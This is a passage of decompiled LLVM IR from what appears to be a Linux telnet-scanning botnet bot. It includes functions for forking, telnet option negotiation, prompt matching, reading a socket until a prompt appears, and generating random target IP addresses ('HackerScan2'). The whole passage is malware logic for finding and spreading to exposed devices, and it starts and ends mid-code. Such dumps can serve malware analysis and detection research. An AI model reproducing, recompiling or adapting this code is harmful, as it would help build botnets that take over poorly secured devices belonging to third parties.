  %v5_80494e3 = call i32 @getsockopt(i32 %arg1, i32 1, i32 4, i32 %v2_80494d5, i32 %v2_80494ce)
  %v3_80494eb = load i32, i32* %stack_var_-184, align 4
  %v1_80494f1 = icmp eq i32 %v3_80494eb, 0
  br i1 %v1_80494f1, label %dec_label_pc_8049519, label %dec_label_pc_80494f5

dec_label_pc_80494f5:                             ; preds = %dec_label_pc_80494c1
  br label %dec_label_pc_8049552

dec_label_pc_8049501:                             ; preds = %dec_label_pc_8049459
  br label %dec_label_pc_8049552

dec_label_pc_804950d:                             ; preds = %dec_label_pc_8049449
  br label %dec_label_pc_8049552

dec_label_pc_8049519:                             ; preds = %dec_label_pc_80494c1, %dec_label_pc_8049415
  %v3_8049523 = call i32 @__libc_fcntl(i32 %arg1, i32 3, i32 0)
  %v4_804952e = and i32 %v3_8049523, -2049
  %v3_8049540 = call i32 @__libc_fcntl(i32 %arg1, i32 4, i32 %v4_804952e)
  br label %dec_label_pc_8049552

dec_label_pc_8049552:                             ; preds = %dec_label_pc_804950d, %dec_label_pc_8049501, %dec_label_pc_80494f5, %dec_label_pc_8049406, %dec_label_pc_8049519
  %v3_8049552 = phi i32 [ 0, %dec_label_pc_804950d ], [ 0, %dec_label_pc_8049501 ], [ 0, %dec_label_pc_80494f5 ], [ 0, %dec_label_pc_8049406 ], [ 1, %dec_label_pc_8049519 ]
  store i32 %v0_8049398, i32* @edi, align 4
  ret i32 %v3_8049552

; uselistorder directives
  uselistorder i32* %stack_var_-40, { 1, 0 }
  uselistorder i32* %stack_var_-176, { 1, 0 }
  uselistorder i32* %stack_var_-180, { 1, 0 }
  uselistorder i32 %arg1, { 8, 7, 6, 5, 1, 0, 4, 3, 2 }
  uselistorder label %dec_label_pc_8049552, { 4, 0, 1, 2, 3 }
}

define i32 @listFork() local_unnamed_addr {
entry:
  %stack_var_-8 = alloca i32, align 4
  %v0_8049560 = load i32, i32* @ebx, align 4
  store i32 %v0_8049560, i32* %stack_var_-8, align 4
  %v1_8049564 = call i32 @__libc_fork(i32 %v0_8049560)
  %v4_804956c = icmp eq i32 %v1_8049564, 0
  %v1_8049570 = icmp eq i1 %v4_804956c, false
  br i1 %v1_8049570, label %dec_label_pc_804957d, label %dec_label_pc_8049572

dec_label_pc_8049572:                             ; preds = %entry
  br label %dec_label_pc_8049661

dec_label_pc_804957d:                             ; preds = %entry
  %v0_804957d = load i32, i32* @global_var_805f8c8.23, align 8
  %v0_8049582 = load i32, i32* @global_var_805f8cc.24, align 4
  %v1_8049588 = add i32 %v0_804957d, 1
  %v5_8049588 = icmp eq i32 %v0_804957d, -1
  %v2_804958b = zext i1 %v5_8049588 to i32
  %v3_804958b = add i32 %v2_804958b, %v0_8049582
  store i32 %v1_8049588, i32* @global_var_805f8c8.23, align 8
  store i32 %v3_804958b, i32* @global_var_805f8cc.24, align 4
  %v2_80495a8 = mul i32 %v1_8049588, 4
  %v1_80495ab = add i32 %v2_80495a8, 4
  %v1_80495b2 = call i32 @malloc(i32 %v1_80495ab)
  br label %dec_label_pc_80495e8

dec_label_pc_80495c6:                             ; preds = %dec_label_pc_80495e8, %dec_label_pc_8049619
  %v2_80495c9 = mul i32 %storemerge1, 4
  %v5_80495ce = add i32 %v2_80495c9, %v1_80495b2
  %v0_80495d9 = load i32, i32* @global_var_8065b54.25, align 4
  %v2_80495de = add i32 %v0_80495d9, %v2_80495c9
  %v1_80495e1 = inttoptr i32 %v2_80495de to i32*
  %v2_80495e1 = load i32, i32* %v1_80495e1, align 4
  %v2_80495e3 = inttoptr i32 %v5_80495ce to i32*
  store i32 %v2_80495e1, i32* %v2_80495e3, align 4
  %v4_80495e5 = add i32 %storemerge1, 1
  br label %dec_label_pc_80495e8

dec_label_pc_80495e8:                             ; preds = %dec_label_pc_804957d, %dec_label_pc_80495c6
  %storemerge1 = phi i32 [ %v4_80495e5, %dec_label_pc_80495c6 ], [ 0, %dec_label_pc_804957d ]
  %v0_80495f6 = load i32, i32* @global_var_805f8c8.23, align 8
  %v0_80495fb = load i32, i32* @global_var_805f8cc.24, align 4
  %v4_8049605 = icmp ne i32 %v0_80495f6, 0
  %v2_8049608 = zext i1 %v4_8049605 to i32
  %v3_8049608 = add i32 %v0_80495fb, -1
  %v4_8049608 = add i32 %v3_8049608, %v2_8049608
  store i32 %v4_8049608, i32* @ebx, align 4
  %v10_8049614 = icmp eq i32 %v4_8049608, 0
  br i1 %v10_8049614, label %dec_label_pc_8049619, label %dec_label_pc_80495c6

dec_label_pc_8049619:                             ; preds = %dec_label_pc_80495e8
  %v1_8049605 = add i32 %v0_80495f6, -1
  %v10_8049624 = icmp ult i32 %storemerge1, %v1_8049605
  br i1 %v10_8049624, label %dec_label_pc_80495c6, label %dec_label_pc_8049629

dec_label_pc_8049629:                             ; preds = %dec_label_pc_8049619
  %v2_8049634 = mul i32 %v0_80495f6, 4
  %v5_8049637 = add i32 %v1_80495b2, -4
  %v1_804963a = add i32 %v5_8049637, %v2_8049634
  store i32 %v1_804963a, i32* @edx, align 4
  %v2_8049640 = inttoptr i32 %v1_804963a to i32*
  store i32 %v1_8049564, i32* %v2_8049640, align 4
  %v0_8049642 = load i32, i32* @global_var_8065b54.25, align 4
  %v1_804964b = call i32 @free(i32 %v0_8049642)
  store i32 %v1_80495b2, i32* @global_var_8065b54.25, align 4
  store i32 %v1_8049564, i32* @ecx, align 4
  br label %dec_label_pc_8049661

dec_label_pc_8049661:                             ; preds = %dec_label_pc_8049572, %dec_label_pc_8049629
  %v3_8049664 = load i32, i32* %stack_var_-8, align 4
  store i32 %v3_8049664, i32* @ebx, align 4
  ret i32 %v1_8049564

; uselistorder directives
  uselistorder i32 %storemerge1, { 1, 0, 2 }
  uselistorder i32 %v2_80495c9, { 1, 0 }
  uselistorder i32 %v1_80495b2, { 2, 0, 1 }
  uselistorder i32 %v0_804957d, { 1, 0 }
  uselistorder label %dec_label_pc_8049661, { 1, 0 }
  uselistorder label %dec_label_pc_80495e8, { 1, 0 }
  uselistorder label %dec_label_pc_80495c6, { 1, 0 }
}

define i32 @negotiate(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %stack_var_-5 = alloca i32, align 4
  %stack_var_-4 = alloca i32, align 4
  %v0_8049669 = load i32, i32* @ebp, align 4
  store i32 %v0_8049669, i32* %stack_var_-4, align 4
  %v1_8049672 = add i32 %arg2, 1
  %v1_8049673 = inttoptr i32 %v1_8049672 to i8*
  %v2_8049673 = load i8, i8* %v1_8049673, align 1
  %v5_8049673 = and i32 %v1_8049672, -256
  %v9_804967f = icmp ult i8 %v2_8049673, -5
  br i1 %v9_804967f, label %dec_label_pc_804975f, label %dec_label_pc_804968c

dec_label_pc_804968c:                             ; preds = %entry
  %v7_8049693 = icmp eq i8 %v2_8049673, -1
  br i1 %v7_8049693, label %dec_label_pc_8049695, label %dec_label_pc_80496af

dec_label_pc_8049695:                             ; preds = %dec_label_pc_804968c
  br label %dec_label_pc_804975f

dec_label_pc_80496af:                             ; preds = %dec_label_pc_804968c
  store i32 -1, i32* %stack_var_-5, align 4
  %v2_80496ba = ptrtoint i32* %stack_var_-5 to i32
  %v4_80496c1 = call i32 @__libc_send(i32 %arg1, i32 %v2_80496ba, i32 1, i32 16384)
  %v2_80496cd = load i8, i8* %v1_8049673, align 1
  %v11_80496cf = icmp eq i8 %v2_80496cd, -4
  %v1_80496d1 = icmp eq i1 %v11_80496cf, false
  br i1 %v1_80496d1, label %dec_label_pc_80496d9, label %dec_label_pc_80496d3

dec_label_pc_80496d3:                             ; preds = %dec_label_pc_80496af
  store i32 -2, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049729

dec_label_pc_80496d9:                             ; preds = %dec_label_pc_80496af
  %v2_80496dd = load i8, i8* %v1_8049673, align 1
  %v11_80496df = icmp eq i8 %v2_80496dd, -2
  %v1_80496e1 = icmp eq i1 %v11_80496df, false
  br i1 %v1_80496e1, label %dec_label_pc_80496e9, label %dec_label_pc_80496e3

dec_label_pc_80496e3:                             ; preds = %dec_label_pc_80496d9
  store i32 -4, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049729

dec_label_pc_80496e9:                             ; preds = %dec_label_pc_80496d9
  %v2_80496ed = load i8, i8* %v1_8049673, align 1
  %v10_80496ef = icmp eq i8 %v2_80496ed, 3
  %v1_80496f1 = icmp eq i1 %v10_80496ef, false
  %v11_8049715 = icmp eq i8 %v2_80496ed, -3
  %v1_8049717 = icmp eq i1 %v11_8049715, false
  br i1 %v1_80496f1, label %dec_label_pc_804970f, label %dec_label_pc_80496f3

dec_label_pc_80496f3:                             ; preds = %dec_label_pc_80496e9
  %. = select i1 %v1_8049717, i32 253, i32 251
  %v7_8049707 = or i32 %., %v5_8049673
  store i32 %v7_8049707, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049729

dec_label_pc_804970f:                             ; preds = %dec_label_pc_80496e9
  %.2 = select i1 %v1_8049717, i32 254, i32 252
  %v5_8049723 = load i32, i32* @edx, align 4
  %v6_8049723 = and i32 %v5_8049723, -256
  %v7_8049723 = or i32 %v6_8049723, %.2
  store i32 %v7_8049723, i32* %stack_var_-5, align 4
  br label %dec_label_pc_8049729

dec_label_pc_8049729:                             ; preds = %dec_label_pc_80496f3, %dec_label_pc_80496e3, %dec_label_pc_80496d3, %dec_label_pc_804970f
  %v4_8049737 = call i32 @__libc_send(i32 %arg1, i32 %v2_80496ba, i32 1, i32 16384)
  %v1_8049742 = add i32 %arg2, 2
  %v4_8049750 = call i32 @__libc_send(i32 %arg1, i32 %v1_8049742, i32 1, i32 16384)
  %v2_8049762.pre = load i32, i32* %stack_var_-4, align 4
  br label %dec_label_pc_804975f

dec_label_pc_804975f:                             ; preds = %dec_label_pc_8049695, %dec_label_pc_8049729, %entry
  %v2_8049762 = phi i32 [ %v0_8049669, %dec_label_pc_8049695 ], [ %v2_8049762.pre, %dec_label_pc_8049729 ], [ %v0_8049669, %entry ]
  store i32 %v2_8049762, i32* @ebp, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32* %stack_var_-5, { 0, 1, 2, 3, 5, 4 }
  uselistorder i32 %arg2, { 1, 0 }
  uselistorder i32 %arg1, { 2, 1, 0 }
  uselistorder label %dec_label_pc_804975f, { 1, 0, 2 }
  uselistorder label %dec_label_pc_8049729, { 3, 0, 1, 2 }
}

define i32 @matchPrompt(i8* %arg1) local_unnamed_addr {
entry:
  %v4_8049772 = ptrtoint i8* %arg1 to i32
  %v3_8049783 = call i32 @_strlen(i8* %arg1)
  %v4_8049783 = mul i32 %v3_8049783, -1
  %v1_8049789 = sub i32 0, %v4_8049783
  %v6_80497b0 = sub i32 %v4_8049772, %v4_8049783
  br label %dec_label_pc_8049832

dec_label_pc_80497a0:                             ; preds = %dec_label_pc_80497f0, %dec_label_pc_80497d9, %dec_label_pc_80497c2, %dec_label_pc_80497ab
  %v4_80497a0 = add nsw i32 %stack_var_-12.026, 1
  %v7_80497a9 = icmp slt i32 %v4_80497a0, %v1_8049789
  br i1 %v7_80497a9, label %dec_label_pc_80497ab, label %dec_label_pc_80497a3.dec_label_pc_8049807_crit_edge

dec_label_pc_80497a3.dec_label_pc_8049807_crit_edge: ; preds = %dec_label_pc_80497a0, %dec_label_pc_80497a3.preheader
  %stack_var_-12.0.lcssa = phi i32 [ %stack_var_-12.1, %dec_label_pc_80497a3.preheader ], [ %v4_80497a0, %dec_label_pc_80497a0 ]
  %.pre = sub i32 %v6_80497b0, %stack_var_-12.0.lcssa
  %.pre10 = inttoptr i32 %.pre to i8*
  br label %dec_label_pc_8049807

dec_label_pc_80497ab:                             ; preds = %dec_label_pc_80497a3.preheader, %dec_label_pc_80497a0
  %stack_var_-12.026 = phi i32 [ %v4_80497a0, %dec_label_pc_80497a0 ], [ %stack_var_-12.1, %dec_label_pc_80497a3.preheader ]
  %v2_80497b8 = sub i32 %v6_80497b0, %stack_var_-12.026
  %v1_80497bc = inttoptr i32 %v2_80497b8 to i8*
  %v2_80497bc = load i8, i8* %v1_80497bc, align 1
  %v4_80497be = icmp eq i8 %v2_80497bc, 0
  br i1 %v4_80497be, label %dec_label_pc_80497a0, label %dec_label_pc_80497c2

dec_label_pc_80497c2:                             ; preds = %dec_label_pc_80497ab
  %v2_80497d3 = load i8, i8* %v1_80497bc, align 1
  %v7_80497d5 = icmp eq i8 %v2_80497d3, 32
  br i1 %v7_80497d5, label %dec_label_pc_80497a0, label %dec_label_pc_80497d9

dec_label_pc_80497d9:                             ; preds = %dec_label_pc_80497c2
  %v2_80497ea = load i8, i8* %v1_80497bc, align 1
  %v10_80497ec = icmp eq i8 %v2_80497ea, 13
  br i1 %v10_80497ec, label %dec_label_pc_80497a0, label %dec_label_pc_80497f0

dec_label_pc_80497f0:                             ; preds = %dec_label_pc_80497d9
  %v2_8049801 = load i8, i8* %v1_80497bc, align 1
  %v10_8049803 = icmp eq i8 %v2_8049801, 10
  br i1 %v10_8049803, label %dec_label_pc_80497a0, label %dec_label_pc_8049807

dec_label_pc_8049807:                             ; preds = %dec_label_pc_80497f0, %dec_label_pc_80497a3.dec_label_pc_8049807_crit_edge
  %stack_var_-12.022 = phi i32 [ %stack_var_-12.0.lcssa, %dec_label_pc_80497a3.dec_label_pc_8049807_crit_edge ], [ %stack_var_-12.026, %dec_label_pc_80497f0 ]
  %v1_8049818.pre-phi = phi i8* [ %.pre10, %dec_label_pc_80497a3.dec_label_pc_8049807_crit_edge ], [ %v1_80497bc, %dec_label_pc_80497f0 ]
  %v2_8049818 = load i8, i8* %v1_8049818.pre-phi, align 1
  %v6_804981d = add i32 %storemerge3, ptrtoint ([6 x i8]* @global_var_805878a.26 to i32)
  %v1_8049820 = inttoptr i32 %v6_804981d to i8*
  %v2_8049820 = load i8, i8* %v1_8049820, align 1
  %v15_8049822 = icmp eq i8 %v2_8049818, %v2_8049820
  %v1_8049824 = icmp eq i1 %v15_8049822, false
  br i1 %v1_8049824, label %dec_label_pc_804982f, label %dec_label_pc_804985c

dec_label_pc_804982f:                             ; preds = %dec_label_pc_8049807
  %v4_804982f = add i32 %storemerge3, 1
  br label %dec_label_pc_8049832

dec_label_pc_8049832:                             ; preds = %entry, %dec_label_pc_804982f
  %stack_var_-12.1 = phi i32 [ 0, %entry ], [ %stack_var_-12.022, %dec_label_pc_804982f ]
  %storemerge3 = phi i32 [ 0, %entry ], [ %v4_804982f, %dec_label_pc_804982f ]
  %v3_8049846 = call i32 @_strlen(i8* getelementptr inbounds ([6 x i8], [6 x i8]* @global_var_805878a.26, i32 0, i32 0))
  %v7_804984d = icmp ult i32 %storemerge3, %v3_8049846
  br i1 %v7_804984d, label %dec_label_pc_80497a3.preheader, label %dec_label_pc_804985c

dec_label_pc_80497a3.preheader:                   ; preds = %dec_label_pc_8049832
  %v7_80497a925 = icmp slt i32 %stack_var_-12.1, %v1_8049789
  br i1 %v7_80497a925, label %dec_label_pc_80497ab, label %dec_label_pc_80497a3.dec_label_pc_8049807_crit_edge

dec_label_pc_804985c:                             ; preds = %dec_label_pc_8049832, %dec_label_pc_8049807
  %storemerge = phi i32 [ 1, %dec_label_pc_8049807 ], [ 0, %dec_label_pc_8049832 ]
  ret i32 %storemerge

; uselistorder directives
  uselistorder i32 %stack_var_-12.1, { 2, 1, 0 }
  uselistorder i32 %v6_80497b0, { 1, 0 }
  uselistorder [6 x i8]* @global_var_805878a.26, { 1, 0 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_8049832, { 1, 0 }
  uselistorder label %dec_label_pc_80497a3.dec_label_pc_8049807_crit_edge, { 1, 0 }
}

define i32 @readUntil(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i8* %arg6, i32 %arg7, i32 %arg8) local_unnamed_addr {
entry:
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-160 = alloca i32, align 4
  store i32 %arg4, i32* %stack_var_-168, align 4
  %v2_80498ab = ptrtoint i32* %stack_var_-160 to i32
  %tmp31 = bitcast i32* %stack_var_-160 to i8*
  %v1_80498c5 = urem i32 %arg1, 32
  %v9_80498c8 = shl i32 1, %v1_80498c5
  %v1_80498d3 = add i32 %arg1, 1
  %v2_80498d7 = ptrtoint i32* %stack_var_-168 to i32
  %v2_80499a6 = inttoptr i32 %arg2 to i8*
  %v4_80499b2 = icmp eq i32 %arg3, 0
  %v1_80499d338 = add i32 %arg8, 2
  %v5_80499d941 = icmp slt i32 %v1_80499d338, %arg7
  br i1 %v5_80499d941, label %dec_label_pc_80499db.lr.ph, label %dec_label_pc_8049a09

dec_label_pc_80499db.lr.ph:                       ; preds = %entry
  %v2_80498bf = udiv i32 %arg1, 32
  %v2_80498c8 = mul nuw nsw i32 %v2_80498bf, 4
  %v3_80498c8 = add nsw i32 %v2_80498c8, -156
  %v5_80498fd = ptrtoint i8* %arg6 to i32
  %tmp36 = icmp slt i32 %arg5, 1
  %tmp37 = icmp eq i1 %tmp36, false
  br label %dec_label_pc_80499db

dec_label_pc_80498a1:                             ; preds = %dec_label_pc_80499e9, %dec_label_pc_80499db
  store i32 %v2_80498ab, i32* @edi, align 4
  %v5_80498b2 = call i8* @_memset(i8* %tmp31, i32 0, i32 32)
  %v0_80498c8 = load i32, i32* @ebp, align 4
  %v4_80498c8 = add i32 %v3_80498c8, %v0_80498c8
  %v5_80498c8 = inttoptr i32 %v4_80498c8 to i32*
  %v6_80498c8 = load i32, i32* %v5_80498c8, align 4
  %v12_80498c8 = or i32 %v6_80498c8, %v9_80498c8
  store i32 %v12_80498c8, i32* %v5_80498c8, align 4
  %v5_80498ea = call i32 @__libc_select(i32 %v1_80498d3, i32 %v2_80498ab, i32 0, i32 0, i32 %v2_80498d7)
  %tmp33 = icmp slt i32 %v5_80498ea, 1
  br i1 %tmp33, label %dec_label_pc_8049a09, label %dec_label_pc_80498fa

dec_label_pc_80498fa:                             ; preds = %dec_label_pc_80498a1
  %v6_80498fd = add i32 %stack_var_-32.042, %v5_80498fd
  %v5_8049900 = inttoptr i32 %v6_80498fd to i8*
  %v5_804990d = call i32 @__libc_recv(i32 %arg1, i32 %v6_80498fd, i32 1, i32 0)
  %v13_8049918 = icmp eq i32 %v5_804990d, -1
  br i1 %v13_8049918, label %dec_label_pc_8049924, label %dec_label_pc_804991e

dec_label_pc_804991e:                             ; preds = %dec_label_pc_80498fa
  %v4_804991e = icmp eq i32 %v5_804990d, 0
  %v1_8049922 = icmp eq i1 %v4_804991e, false
  br i1 %v1_8049922, label %dec_label_pc_8049933, label %dec_label_pc_8049924

dec_label_pc_8049924:                             ; preds = %dec_label_pc_804991e, %dec_label_pc_80498fa
  br label %dec_label_pc_8049a13

dec_label_pc_8049933:                             ; preds = %dec_label_pc_804991e
  %v5_8049936 = add i32 %v5_804990d, %stack_var_-32.042
  %v2_804993c = load i8, i8* %v5_8049900, align 1
  %v11_804993e = icmp eq i8 %v2_804993c, -1
  %v1_8049940 = icmp eq i1 %v11_804993e, false
  br i1 %v1_8049940, label %dec_label_pc_804999d, label %dec_label_pc_8049942

dec_label_pc_8049942:                             ; preds = %dec_label_pc_8049933
  %v1_8049945 = add i32 %v6_80498fd, 1
  %v5_804994e = call i32 @__libc_recv(i32 %arg1, i32 %v1_8049945, i32 2, i32 0)
  %v13_8049959 = icmp eq i32 %v5_804994e, -1
  br i1 %v13_8049959, label %dec_label_pc_8049965, label %dec_label_pc_804995f

dec_label_pc_804995f:                             ; preds = %dec_label_pc_8049942
  %v4_804995f = icmp eq i32 %v5_804994e, 0
  %v1_8049963 = icmp eq i1 %v4_804995f, false
  br i1 %v1_8049963, label %dec_label_pc_8049974, label %dec_label_pc_8049965

dec_label_pc_8049965:                             ; preds = %dec_label_pc_804995f, %dec_label_pc_8049942
  br label %dec_label_pc_8049a13

dec_label_pc_8049974:                             ; preds = %dec_label_pc_804995f
  %v5_8049977 = add i32 %v5_804994e, %v5_8049936
  %v3_8049985 = call i32 @negotiate(i32 %arg1, i32 %v6_80498fd, i32 3)
  %v1_804998d = icmp eq i32 %v3_8049985, 0
  %v1_804998f = icmp eq i1 %v1_804998d, false
  br i1 %v1_804998f, label %dec_label_pc_80499d0.backedge, label %dec_label_pc_8049991

dec_label_pc_80499d0.backedge:                    ; preds = %dec_label_pc_8049974, %dec_label_pc_80499b2, %dec_label_pc_80499b8
  %stack_var_-32.0.be = phi i32 [ %v5_8049936, %dec_label_pc_80499b2 ], [ %v5_8049936, %dec_label_pc_80499b8 ], [ %v5_8049977, %dec_label_pc_8049974 ]
  %v1_80499d3 = add i32 %stack_var_-32.0.be, 2
  %v5_80499d9 = icmp slt i32 %v1_80499d3, %arg7
  br i1 %v5_80499d9, label %dec_label_pc_80499d0.backedge.dec_label_pc_80499db_crit_edge, label %dec_label_pc_8049a09

dec_label_pc_80499d0.backedge.dec_label_pc_80499db_crit_edge: ; preds = %dec_label_pc_80499d0.backedge
  %v3_80499db.pre = load i32, i32* %stack_var_-168, align 4
  br label %dec_label_pc_80499db

dec_label_pc_8049991:                             ; preds = %dec_label_pc_8049974
  br label %dec_label_pc_8049a13

dec_label_pc_804999d:                             ; preds = %dec_label_pc_8049933
  %v3_80499a6 = call i32 @strstr(i32 %v5_80498fd, i8* %v2_80499a6)
  %v1_80499ae = icmp eq i32 %v3_80499a6, 0
  %v1_80499b0 = icmp eq i1 %v1_80499ae, false
  br i1 %v1_80499b0, label %dec_label_pc_80499fd, label %dec_label_pc_80499b2

dec_label_pc_80499b2:                             ; preds = %dec_label_pc_804999d
  br i1 %v4_80499b2, label %dec_label_pc_80499d0.backedge, label %dec_label_pc_80499b8

dec_label_pc_80499b8:                             ; preds = %dec_label_pc_80499b2
  %v3_80499bb = call i32 @matchPrompt(i8* %arg6)
  %v1_80499c3 = icmp eq i32 %v3_80499bb, 0
  br i1 %v1_80499c3, label %dec_label_pc_80499d0.backedge, label %dec_label_pc_80499fd

dec_label_pc_80499db:                             ; preds = %dec_label_pc_80499d0.backedge.dec_label_pc_80499db_crit_edge, %dec_label_pc_80499db.lr.ph
  %v3_80499db = phi i32 [ %arg4, %dec_label_pc_80499db.lr.ph ], [ %v3_80499db.pre, %dec_label_pc_80499d0.backedge.dec_label_pc_80499db_crit_edge ]
  %stack_var_-32.042 = phi i32 [ %arg8, %dec_label_pc_80499db.lr.ph ], [ %stack_var_-32.0.be, %dec_label_pc_80499d0.backedge.dec_label_pc_80499db_crit_edge ]
  %tmp34 = icmp slt i32 %v3_80499db, 1
  %tmp35 = icmp eq i1 %tmp34, false
  br i1 %tmp35, label %dec_label_pc_80498a1, label %dec_label_pc_80499e9

dec_label_pc_80499e9:                             ; preds = %dec_label_pc_80499db
  br i1 %tmp37, label %dec_label_pc_80498a1, label %dec_label_pc_8049a09

dec_label_pc_80499fd:                             ; preds = %dec_label_pc_80499b8, %dec_label_pc_804999d
  br label %dec_label_pc_8049a13

dec_label_pc_8049a09:                             ; preds = %dec_label_pc_80499d0.backedge, %dec_label_pc_80499e9, %dec_label_pc_80498a1, %entry
  br label %dec_label_pc_8049a13

dec_label_pc_8049a13:                             ; preds = %dec_label_pc_80499fd, %dec_label_pc_8049991, %dec_label_pc_8049965, %dec_label_pc_8049924, %dec_label_pc_8049a09
  %v3_8049a13 = phi i32 [ 1, %dec_label_pc_80499fd ], [ 0, %dec_label_pc_8049991 ], [ 0, %dec_label_pc_8049965 ], [ 0, %dec_label_pc_8049924 ], [ 0, %dec_label_pc_8049a09 ]
  ret i32 %v3_8049a13

; uselistorder directives
  uselistorder i32 %stack_var_-32.0.be, { 1, 0 }
  uselistorder i32 %v5_804994e, { 0, 2, 1 }
  uselistorder i32 %v5_804990d, { 0, 2, 1 }
  uselistorder i32 %v5_80498fd, { 1, 0 }
  uselistorder i32* %stack_var_-168, { 0, 2, 1 }
  uselistorder i32 %arg7, { 1, 0 }
  uselistorder i8* %arg6, { 1, 0 }
  uselistorder i32 %arg1, { 5, 4, 3, 0, 2, 1 }
  uselistorder label %dec_label_pc_8049a13, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_8049a09, { 1, 0, 2, 3 }
  uselistorder label %dec_label_pc_80499d0.backedge, { 2, 1, 0 }
}

define i32 @HackerScan2(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-28 = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v0_8049a21 = load i32, i32* @ebx, align 4
  store i32 %v0_8049a21, i32* %stack_var_-8, align 4
  store i8 0, i8* @global_var_805f8d7.27, align 1
  store i8 0, i8* @global_var_805f8d8.28, align 8
  store i8 0, i8* @global_var_805f8d9.29, align 1
  store i8 0, i8* @global_var_805f8da.30, align 2
  %v1_8049a41 = call i32 @random()
  %v2_8049a51 = ashr i32 %v1_8049a41, 31
  %v2_8049a54 = zext i32 %v1_8049a41 to i64
  %v4_8049a54 = zext i32 %v2_8049a51 to i64
  %v5_8049a54 = mul nuw i64 %v4_8049a54, 4294967296
  %v6_8049a54 = or i64 %v5_8049a54, %v2_8049a54
  %v10_8049a54 = srem i64 %v6_8049a54, 255
  %v11_8049a54 = trunc i64 %v10_8049a54 to i32
  store i32 %v11_8049a54, i32* @eax, align 4
  %v1_8049a58 = trunc i64 %v10_8049a54 to i8
  store i8 %v1_8049a58, i8* @global_var_805f8d7.27, align 1
  %v0_8049a5d = call i32 @random()
  %v2_8049a6d = ashr i32 %v0_8049a5d, 31
  %v2_8049a70 = zext i32 %v0_8049a5d to i64
  %v4_8049a70 = zext i32 %v2_8049a6d to i64
  %v5_8049a70 = mul nuw i64 %v4_8049a70, 4294967296
  %v6_8049a70 = or i64 %v5_8049a70, %v2_8049a70
  %v10_8049a70 = srem i64 %v6_8049a70, 255
  %v11_8049a70 = trunc i64 %v10_8049a70 to i32
  store i32 %v11_8049a70, i32* @eax, align 4
  %v1_8049a74 = trunc i64 %v10_8049a70 to i8
  store i8 %v1_8049a74, i8* @global_var_805f8d8.28, align 8
  %v0_8049a79 = call i32 @random()
  %v2_8049a89 = ashr i32 %v0_8049a79, 31
  %v2_8049a8c = zext i32 %v0_8049a79 to i64
  %v4_8049a8c = zext i32 %v2_8049a89 to i64
  %v5_8049a8c = mul nuw i64 %v4_8049a8c, 4294967296
  %v6_8049a8c = or i64 %v5_8049a8c, %v2_8049a8c
  %v10_8049a8c = srem i64 %v6_8049a8c, 255
  %v11_8049a8c = trunc i64 %v10_8049a8c to i32
  store i32 %v11_8049a8c, i32* @eax, align 4
  %v1_8049a90 = trunc i64 %v10_8049a8c to i8
  store i8 %v1_8049a90, i8* @global_var_805f8d9.29, align 1
  %v0_8049a95 = call i32 @random()
  %v2_8049aa5 = ashr i32 %v0_8049a95, 31
  %v2_8049aa8 = zext i32 %v0_8049a95 to i64
  %v4_8049aa8 = zext i32 %v2_8049aa5 to i64
  %v5_8049aa8 = mul nuw i64 %v4_8049aa8, 4294967296
  %v6_8049aa8 = or i64 %v5_8049aa8, %v2_8049aa8
  %v10_8049aa8 = srem i64 %v6_8049aa8, 255
  %v11_8049aa8 = trunc i64 %v10_8049aa8 to i32
  store i32 %v11_8049aa8, i32* @eax, align 4
  %v1_8049aac = trunc i64 %v10_8049aa8 to i8
  store i8 %v1_8049aac, i8* @global_var_805f8da.30, align 2
  %v0_8049ab1 = call i32 @random()
  %v2_8049ac1 = ashr i32 %v0_8049ab1, 31
  %v2_8049ac4 = zext i32 %v0_8049ab1 to i64
  %v4_8049ac4 = zext i32 %v2_8049ac1 to i64
  %v5_8049ac4 = mul nuw i64 %v4_8049ac4, 4294967296
  %v6_8049ac4 = or i64 %v5_8049ac4, %v2_8049ac4
  %v10_8049ac4 = srem i64 %v6_8049ac4, 208
  %v11_8049ac4 = trunc i64 %v10_8049ac4 to i32
  store i32 %v11_8049ac4, i32* @edx, align 4
  %v4_8049ac9 = icmp eq i32 %v11_8049ac4, 0
  %v1_8049acd = icmp eq i1 %v4_8049ac9, false
  br i1 %v1_8049acd, label %dec_label_pc_8049af9, label %dec_label_pc_8049acf

dec_label_pc_8049acf:                             ; preds = %entry
  %v0_8049acf = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049acf = zext i8 %v0_8049acf to i32
  store i32 %v1_8049acf, i32* @edx, align 4
  %v0_8049adb = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049adb = zext i8 %v0_8049adb to i32
  %v2_8049aea = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049aea, i32* @ebx, align 4
  %v5_8049af1 = call i32 @szprintf(i32 %v2_8049aea, i32 ptrtoint ([12 x i8]* @global_var_8058791.31 to i32), i32 %v1_8049adb, i32 %v1_8049acf)
  br label %dec_label_pc_8049af9

dec_label_pc_8049af9:                             ; preds = %entry, %dec_label_pc_8049acf
  %v12_8049af9 = icmp eq i32 %v11_8049ac4, 1
  %v1_8049afd = icmp eq i1 %v12_8049af9, false
  br i1 %v1_8049afd, label %dec_label_pc_8049b29, label %dec_label_pc_8049aff

dec_label_pc_8049aff:                             ; preds = %dec_label_pc_8049af9
  %v0_8049aff = load i8, i8* @global_var_805f8da.30, align 2
  %v1_8049aff = zext i8 %v0_8049aff to i32
  store i32 %v1_8049aff, i32* @edx, align 4
  %v0_8049b0b = load i8, i8* @global_var_805f8d9.29, align 1
  %v1_8049b0b = zext i8 %v0_8049b0b to i32
  %v2_8049b1a = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_8049b1a, i32* @ebx, align 4
  %v5_8049b21 = call i32 @szprintf(i32 %v2_8049b1a, i32 ptrtoint ([14 x i8]* @global_var_805879d.32 to i32), i32 %v1_8049b0b, i32 %v1_8049aff)
  br label %dec_label_pc_8049b29

dec_label_pc_8049b29:                             ; preds = %dec_label_pc_8049af9, %dec_label_pc_8049aff
